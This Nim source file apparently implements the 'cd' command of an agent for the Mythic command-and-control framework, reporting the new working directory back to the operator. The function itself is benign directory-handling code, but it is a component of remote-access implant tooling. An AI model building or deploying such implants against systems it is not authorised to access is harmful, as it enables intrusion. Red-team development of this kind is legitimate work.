import ../config
import ../utils/mythic_responses
import std/[json, os, strformat, strutils]

type
  CdArgs = object
    path: string

proc changeDirectory*(taskId: string, params: string): JsonNode =
  let cfg = getConfig()
  
  # Parse arguments
  let args = parseJson(params).to(CdArgs)
  
  if cfg.debug:
    echo "[DEBUG] Changing directory to: ", args.path
  
  try:
    # Check for UNC paths - Windows doesn't support cd to UNC paths
    if args.path.startsWith("\\\\"):
      return mythicError(taskId, "Cannot cd to UNC paths. Use 'net use' to map a drive letter first, or use absolute UNC paths in file operations (ls, cat, etc.)")
    
    # Handle the path
    let targetPath = if isAbsolute(args.path):
      args.path
    else:
      getCurrentDir() / args.path
    
    # Check if directory exists
    if not dirExists(targetPath):
      return mythicError(taskId, &"Directory does not exist: {targetPath}")
    
    # Change directory
    setCurrentDir(targetPath)
    
    # Get the new current directory
    let newCwd = getCurrentDir()
    
    if cfg.debug:
      echo "[DEBUG] Changed directory to: ", newCwd
    
    # Return response with cwd callback
    return mythicCallback(taskId, &"Changed directory to '{newCwd}'", %*{
      "cwd": newCwd
    })
    
  except OSError as e:
    return mythicError(taskId, &"Failed to change directory: {e.msg}")
  except Exception as e:
    return mythicError(taskId, &"Error: {e.msg}")
